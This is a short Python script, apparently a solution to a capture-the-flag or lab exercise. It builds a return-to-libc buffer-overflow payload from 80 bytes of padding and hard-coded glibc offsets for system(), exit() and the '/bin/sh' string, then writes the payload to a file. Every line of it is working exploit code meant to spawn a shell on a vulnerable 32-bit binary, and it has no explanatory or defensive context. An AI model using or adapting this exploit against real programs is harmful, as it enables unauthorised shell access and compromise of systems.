import struct

offset = 76 + 4	# buff len + offset
libc_base_addr = 0xb7e2c000 #base virt addr of glibc
exit_offset = 0x32be0 #offset of the exit fn inside glibc
system_offset = 0x3f060 #offset of the system fn inside glibc
bin_sh_offset = 0x160c58 #offset of the /bin/sh string inside glibc
main_ret_offset = 0x0804854b #address of main function return instruction

# Create the payload
payload = b"A" * offset
payload += struct.pack("<I", main_ret_offset)     #return to main to bypasss check, then return to libc
payload += struct.pack("<I", libc_base_addr + system_offset)
payload += struct.pack("<I", libc_base_addr + exit_offset)
payload += struct.pack("<I", libc_base_addr + bin_sh_offset)


# Save the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)
